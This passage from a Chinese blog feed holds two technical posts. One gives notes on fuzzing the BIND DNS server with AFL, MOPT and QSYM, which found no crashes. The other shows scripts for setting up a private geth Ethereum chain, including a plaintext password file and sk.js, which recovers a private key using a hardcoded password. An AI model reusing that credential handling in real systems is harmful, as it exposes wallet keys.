class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="使用qsym进行测试（结合MOPT-FAST）"><a href="#使用qsym进行测试（结合MOPT-FAST）" class="headerlink" title="使用qsym进行测试（结合MOPT-FAST）"></a>使用qsym进行测试（结合MOPT-FAST）</h2><ul><li>使用正常的<code>gcc</code>编译<code>bind</code>，将生成的<code>named</code>复制到<code>test/uninstrumented</code>下 （运行qsym需要）</li><li>使用<code>afl-gcc</code>编译<code>bind</code>，将生成的<code>named</code>复制到<code>test/instrumented</code>下 （运行afl-fuzz的master和slave需要）</li><li>选取<code>MOPT-FAST</code>中的一个测试用例，复制到<code>test/testcase_dir</code></li><li>按照qsym文档的顺序依次启动master，slave和qsym，命令如下</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m 4096 -M afl-master -i testcase_dir/ -o finding_dir/ -- ./instrumented/named</span><br><span class="line">afl-fuzz -m 4096 -S afl-slave -i testcase_dir/ -o finding_dir/ -- ./instrumented/named</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开qsym环境</span></span><br><span class="line"><span class="built_in">source</span> ../qsym/venv/bin/activate</span><br><span class="line">../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><ul><li>报错 Pipe at the beginning of ‘core_pattern’</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>之前我们创建了一个virtualenv，这次运行第三个命令时，也要先进入这个环境中</p></blockquote><h3 id="master输出"><a href="#master输出" class="headerlink" title="master输出"></a>master输出</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                     american fuzzy lop 2.57b (afl-master)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 0 min, 59 sec       │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 2 sec        │  total paths : 15     │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : none seen yet                      │ <span class="built_in">uniq</span> crashes : 0      │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : none seen yet                      │   <span class="built_in">uniq</span> hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 0 (0.00%)         │    map density : 7.53% / 7.59%         │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 1.01 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : havoc                 │ favored paths : 1 (6.67%)              │</span><br><span class="line">│ stage execs : 2533/16.4k (15.46%)   │  new edges on : 13 (86.67%)            │</span><br><span class="line">│ total execs : 3608                  │ total crashes : 0 (0 unique)           │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 50.36/sec (slow!)     │  total tmouts : 4 (4 unique)           │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : 1/32, 0/31, 0/29                      │    levels : 2          │</span><br><span class="line">│  byte flips : 0/4, 0/3, 0/1                         │   pending : 15         │</span><br><span class="line">│ arithmetics : 1/224, 0/25, 0/0                      │  pend fav : 1          │</span><br><span class="line">│  known ints : 0/25, 0/84, 0/44                      │ own finds : 14         │</span><br><span class="line">│  dictionary : 0/0, 0/0, 0/0                         │  imported : 0          │</span><br><span class="line">│       havoc : 0/0, 0/0                              │ stability : 97.85%     │</span><br><span class="line">│        trim : n/a, 0.00%                            ├────────────────────────┘</span><br><span class="line">└─────────────────────────────────────────────────────┘          [cpu000:168%]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="slave-输出"><a href="#slave-输出" class="headerlink" title="slave 输出"></a>slave 输出</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   american fuzzy lop 2.57b (afl-slave)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 0 min, 33 sec       │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 4 sec        │  total paths : 14     │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : none seen yet                      │ <span class="built_in">uniq</span> crashes : 0      │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : none seen yet                      │   <span class="built_in">uniq</span> hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 0 (0.00%)         │    map density : 7.53% / 7.58%         │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 1.49 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : havoc                 │ favored paths : 1 (7.14%)              │</span><br><span class="line">│ stage execs : 1163/4096 (28.39%)    │  new edges on : 11 (78.57%)            │</span><br><span class="line">│ total execs : 1700                  │ total crashes : 0 (0 unique)           │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 50.70/sec (slow!)     │  total tmouts : 12 (8 unique)          │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : n/a, n/a, n/a                         │    levels : 2          │</span><br><span class="line">│  byte flips : n/a, n/a, n/a                         │   pending : 14         │</span><br><span class="line">│ arithmetics : n/a, n/a, n/a                         │  pend fav : 1          │</span><br><span class="line">│  known ints : n/a, n/a, n/a                         │ own finds : 13         │</span><br><span class="line">│  dictionary : n/a, n/a, n/a                         │  imported : 0          │</span><br><span class="line">│       havoc : 0/0, 0/0                              │ stability : 53.47%     │</span><br><span class="line">│        trim : n/a, n/a                              ├────────────────────────┘</span><br><span class="line">└─────────────────────────────────────────────────────┘          [cpu001:166%]</span><br></pre></td></tr></table></figure><h3 id="qsym-输出"><a href="#qsym-输出" class="headerlink" title="qsym 输出"></a>qsym 输出</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(venv) tt@ubuntu:~/Desktop/dns/test$ ../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Temp directory=/tmp/tmpvbo369</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000037,src:000005,op:havoc,rep:2,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-0/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-0 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Total=13 s, Emulation=13 s, Solver=0 s, Return=-4</span><br><span class="line">DEBUG:qsym.afl:Generate 0 testcases</span><br><span class="line">DEBUG:qsym.afl:0 testcases are new</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000032,src:000005,op:havoc,rep:16,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-1/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-1 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Total=9 s, Emulation=9 s, Solver=0 s, Return=-4</span><br><span class="line">DEBUG:qsym.afl:Generate 0 testcases</span><br><span class="line">DEBUG:qsym.afl:0 testcases are new</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000024,src:000005,op:havoc,rep:128,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-2/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-2 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p><code>qsym</code>结合<code>mopt</code>对<code>bind</code>的<code>dns</code>服务器进行了测试，<code>afl</code>总共跑了<code>1 days, 11 hrs, 53 min, 22 sec</code>, 并没有生成任何testcase</p></li><li><p>每次输出总伴随这个这个timeout，不知道是什么问题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmphuJKne/qsym-out-262/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmphuJKne/qsym-out-262 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>查看了很多<code>issue</code>，发现上传的日志中大家也都有timeout</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;使用afl对bind进行编译&quot;&gt;&lt;a href=&quot;#使用afl对bind进行编译&quot; class=&quot;headerlink&quot; title=&quot;使用afl对bind进行编译&quot;&gt;&lt;/a&gt;使用afl对bind进行编译&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;希望使用afl对bind进行编译&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;./configure -help&lt;/code&gt;知道，需要配置下面几个环境变量，达到替换编译器的目的&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CC=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-gcc&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CXX=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-g++&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;对bind进行编译&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;使用qsym进行测试（结合MOPT-FAST）&quot;&gt;&lt;a href=&quot;#使用qsym进行测试（结合MOPT-FAST）&quot; class=&quot;headerlink&quot; title=&quot;使用qsym进行测试（结合MOPT-FAST）&quot;&gt;&lt;/a&gt;使用qsym进行测试（结合MOPT-FAST）&lt;/h2&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="QSYM" scheme="https://jingtianer.github.io/home/tags/QSYM/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
    <category term="MOPT" scheme="https://jingtianer.github.io/home/tags/MOPT/"/>
    
    <category term="bind" scheme="https://jingtianer.github.io/home/tags/bind/"/>
    
  </entry>
  
  <entry>
    <title>geth搭建私链</title>
    <link href="https://jingtianer.github.io/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/"/>
    <id>https://jingtianer.github.io/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/</id>
    <published>2023-01-10T03:28:00.000Z</published>
    <updated>2023-02-12T03:09:54.478Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h2><p>参考<code>go-ethereum</code>官网的<a href="https://geth.ethereum.org/docs/fundamentals/private-network">Private Networks</a>文档搭建了一个私有链，并总结出几个脚本，可以半自动化地实现geth网络的搭建，脚本已上传至github仓库<a href="https://github.com/jingtianer/DLCCB">DLCCB</a></p><h2 id="setup-sh"><a href="#setup-sh" class="headerlink" title="setup.sh"></a>setup.sh</h2><ul><li>这一步使用了以下几个工具<ul><li><code>geth</code>命令，用于生成初始两个节点的账户，使用创世块配置文件对两个账户进行初始化</li><li><code>puppeth</code> 用于生成创世块的配置文件，这个命令是交互式的，编写了一个<code>puppeth.txt</code>作为其输入，默认生成一个基于pow的区块链</li><li><code>bootnode</code> 用于生成启动bootnode</li></ul></li><li>这一步使用了以下几个linux命令<ul><li><code>sed</code> 非交互式的文本编辑器，用于读取生成的账户的区块链地址，写入<code>puppeth.txt</code>中，使得<code>puppeth</code>工具能为初始的两个节点分配一定的以太币</li><li><code>awk</code>，用于对文本的处理</li></ul></li></ul><figure class="highlight sh"><figcaption><span>setup.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> node1 node2</span><br><span class="line">geth --datadir node1 account new &lt; password.txt</span><br><span class="line">geth --datadir node2 account new &lt; password.txt</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;5i<span class="subst">$(cat node1/keystore/UTC--* | awk &#x27;&#123;split($0, arr, <span class="string">&quot;\&quot;&quot;</span>)</span>; print arr[4]&#125;&#x27;)&quot;</span> puppeth.txt </span><br><span class="line">sed -i <span class="string">&quot;5i<span class="subst">$(cat node2/keystore/UTC--* | awk &#x27;&#123;split($0, arr, <span class="string">&quot;\&quot;&quot;</span>)</span>; print arr[4]&#125;&#x27;)&quot;</span> puppeth.txt </span><br><span class="line">puppeth &lt; puppeth.txt</span><br><span class="line">sed -i <span class="string">&quot;5d&quot;</span> puppeth.txt</span><br><span class="line">sed -i <span class="string">&quot;5d&quot;</span> puppeth.txt</span><br><span class="line"></span><br><span class="line">geth init --datadir node1 tianer.json</span><br><span class="line">geth init --datadir node2 tianer.json</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> password.txt | <span class="built_in">head</span> -n 1 | <span class="built_in">tee</span> node1/password.txt</span><br><span class="line"><span class="built_in">cat</span> password.txt | <span class="built_in">head</span> -n 1 | <span class="built_in">tee</span> node2/password.txt</span><br><span class="line"></span><br><span class="line">bootnode -genkey boot.key</span><br><span class="line">bootnode -nodekey boot.key -addr :30305</span><br></pre></td></tr></table></figure><h3 id="两个输入文件的内容"><a href="#两个输入文件的内容" class="headerlink" title="两个输入文件的内容"></a>两个输入文件的内容</h3><figure class="highlight plaintext"><figcaption><span>password.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1234567890</span><br><span class="line">1234567890</span><br></pre></td></tr></table></figure><blockquote><p>这里两个节点的密码是相同的，也可以单独为每个节点写一个密码文件，但是密码文件必须两行相同，因为创建账户时需要输入两次密码</p></blockquote><figure class="highlight plaintext"><figcaption><span>puppeth.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tianer</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">yes</span><br><span class="line">12345</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><blockquote><p>从上到下依次对配置创世块的配置文件进行创建，导出保存，删除。<br>会使用sed命令在第五行临时插入刚刚生成的账户文件的区块链地址，这样<code>puppeth</code>命令就知道要给哪些地址分配初始的以太币</p></blockquote><h3 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h3><p>sed 命令是一个面向行处理的工具，它以“行”为处理单位，针对每一行进行处理，处理后的结果会输出到标准输出（STDOUT）。你会发现 sed 命令是很懂礼貌的一个命令，它不会对读取的文件做任何贸然的修改，而是将内容都输出到标准输出中。</p><ul><li><p>基本用法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [选项] <span class="string">&quot;指令&quot;</span> 文件</span><br></pre></td></tr></table></figure></li><li><p>选项，如果希望sed命令对文件直接进行更改，需要添加<code>-i</code>参数， 以下是几个查那个用的参数</p><ul><li><code>-e</code> 　　–它告诉sed将下一个参数解释为一个sed指令，只有当命令行上给出多个sed指令时使用</li><li><code>-f</code> 　　–后跟保存了sed指令的文件</li><li><code>-i</code> 　　–直接对内容进行修改，不加 i 时默认只是预览，不会对文件进行实际修改</li><li><code>-n</code> 　　–取消默认输出，sed默认会输出所有文本内容，使用 -n 参数后只显示处理过的行</li></ul></li><li><p>指令，类似vim，sed也有编辑命令</p><ul><li><code>a</code> 　　  –追加，向匹配行后插入内容</li><li><code>c</code> 　    –更改，更改匹配行的内容</li><li><code>i</code> 　    –插入，向匹配行前插入内容</li><li><code>d</code>   　　–删除，删除匹配的内容</li><li><code>s</code>   　　–替换，替换匹配到的内容</li><li><code>p</code> 　    –打印，打印匹配到的内容，通常与 -n 和用</li><li><code>=</code> 　　  –用来打印被匹配到的行的行号</li><li><code>n</code>　　   –读取下一行，遇到n时会自动跳入下一行</li><li><code>r,w</code> 　　–读和写，r用于将内容读入文件，w用于将匹配内容写入到文件</li></ul></li></ul><blockquote><p>其中<code>s</code>命令后跟正则串和目标串，可以起到文本的匹配替换<br><code>sed</code>的指令使用<code>/</code>作为定界符，转义符为<code>\</code></p></blockquote><p>例子：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/book/books/&#x27;</span> file</span><br><span class="line">sed -i <span class="string">&#x27;s/book/books/g&#x27;</span> file <span class="comment"># 后缀g对每行的所有匹配进行替换</span></span><br><span class="line">sed -i <span class="string">&#x27;2d&#x27;</span> file <span class="comment">#删除指定行</span></span><br><span class="line">sed -i <span class="string">&#x27;5ixxxxx&#x27;</span> file <span class="comment">#在指定行插入xxxxx</span></span><br></pre></td></tr></table></figure><ul><li>具体可以参考<a href="https://blog.csdn.net/L1259863243/article/details/79364094">这里</a></li></ul><h3 id="awk命令"><a href="#awk命令" class="headerlink" title="awk命令"></a>awk命令</h3><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。<br>之所以叫 AWK 是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符<br>linux中有三剑客之称：<br>三剑客之首就是 AWK<br>三剑客功能:<br>grep ： 过滤文本<br>sed  :  修改文本<br>awk  :  处理文本</p><ul><li>语法格式</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk [参数] [处理内容] [操作对象]</span><br></pre></td></tr></table></figure><ul><li>具体可以参考<a href="http://c.biancheng.net/view/4082.html">这里</a></li></ul><h2 id="mine-sh"><a href="#mine-sh" class="headerlink" title="mine.sh"></a>mine.sh</h2><p>用于启动创建的两个节点</p><figure class="highlight sh"><figcaption><span>mine.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NODE=<span class="variable">$2</span></span><br><span class="line">ENODE=<span class="variable">$1</span></span><br><span class="line">AUTHRPCPORT=$((<span class="variable">$2</span>+<span class="number">8554</span>))</span><br><span class="line">PORT=$((<span class="variable">$2</span>+<span class="number">30308</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> geth --datadir node<span class="variable">$NODE</span> --port <span class="variable">$PORT</span> --bootnodes <span class="variable">$ENODE</span> --networkid 12345 --unlock 0x$(<span class="built_in">cat</span> node<span class="variable">$NODE</span>/keystore/UTC--* | awk <span class="string">&#x27;&#123;split($0, arr, &quot;\&quot;&quot;); print arr[4]&#125;&#x27;</span>) --password node1/password.txt --authrpc.port <span class="variable">$AUTHRPCPORT</span></span><br><span class="line"></span><br><span class="line">geth --datadir node<span class="variable">$NODE</span> --port <span class="variable">$PORT</span> --bootnodes <span class="variable">$ENODE</span> --networkid 12345 --unlock 0x$(<span class="built_in">cat</span> node<span class="variable">$NODE</span>/keystore/UTC--* | awk <span class="string">&#x27;&#123;split($0, arr, &quot;\&quot;&quot;); print arr[4]&#125;&#x27;</span>) --password node1/password.txt --authrpc.port <span class="variable">$AUTHRPCPORT</span> --mine</span><br></pre></td></tr></table></figure><blockquote><p>前一个脚本执行后，会输出enode， 将其复制下来，打开两个新的terminal窗口，enode作为这个脚本的第一个参数，第二个参数是希望启动的节点的编号</p></blockquote><h2 id="attach-sh"><a href="#attach-sh" class="headerlink" title="attach.sh"></a>attach.sh</h2><p>用于让两个节点开始挖矿，使用<code>geth attach</code>打开js交互界面，<code>miner.txt</code>作为输入文件，执行命令<code>miner.start(1)</code>开始挖矿</p><figure class="highlight sh"><figcaption><span>attach.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> geth attach node<span class="variable">$NODE</span>/geth.ipc</span><br><span class="line">geth attach node<span class="variable">$NODE</span>/geth.ipc  &lt; miner.txt</span><br></pre></td></tr></table></figure><blockquote><p>参数为希望开始挖矿的节点编号，也需要打开新的terminal执行</p></blockquote><figure class="highlight js"><figcaption><span>miner.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.<span class="property">peerCount</span></span><br><span class="line">eth.<span class="title function_">getBalance</span>(eth.<span class="property">accounts</span>[<span class="number">0</span>])</span><br><span class="line">miner.<span class="title function_">start</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="sk-js"><a href="#sk-js" class="headerlink" title="sk.js"></a>sk.js</h2><p>用于获取节点的私钥，在开发时私钥很重要</p><figure class="highlight js"><figcaption><span>sk.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> keythereum = <span class="built_in">require</span>(<span class="string">&quot;keythereum&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> datadir = <span class="string">&quot;/home/tt/eth/net/node2/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> address= <span class="string">&quot;e43b98ac32beb344c94b15b9af5b46674d6c3e6d&quot;</span>;<span class="comment">//要小写</span></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> keyObject = keythereum.<span class="title function_">importFromFile</span>(address, datadir);</span><br><span class="line"><span class="keyword">var</span> privateKey = keythereum.<span class="title function_">recover</span>(password, keyObject);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(privateKey.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>需要节点的<code>datadir</code>和节点的<code>address</code></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;主要工作&quot;&gt;&lt;a href=&quot;#主要工作&quot; class=&quot;headerlink&quot; title=&quot;主要工作&quot;&gt;&lt;/a&gt;主要工作&lt;/h2&gt;&lt;p&gt;参考&lt;code&gt;go-ethereum&lt;/code&gt;官网的&lt;a href=&quot;https://geth.ethereum.org/docs/fundamentals/private-network&quot;&gt;Private Networks&lt;/a&gt;文档搭建了一个私有链，并总结出几个脚本，可以半自动化地实现geth网络的搭建，脚本已上传至github仓库&lt;a href=&quot;https://github.com/jingtianer/DLCCB&quot;&gt;DLCCB&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;setup-sh&quot;&gt;&lt;a href=&quot;#setup-sh&quot; class=&quot;headerlink&quot; title=&quot;setup.sh&quot;&gt;&lt;/a&gt;setup.sh&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这一步使用了以下几个工具&lt;ul&gt;
&lt;li&gt;&lt;code&gt;geth&lt;/code&gt;命令，用于生成初始两个节点的账户，使用创世块配置文件对两个账户进行初始化&lt;/li&gt;
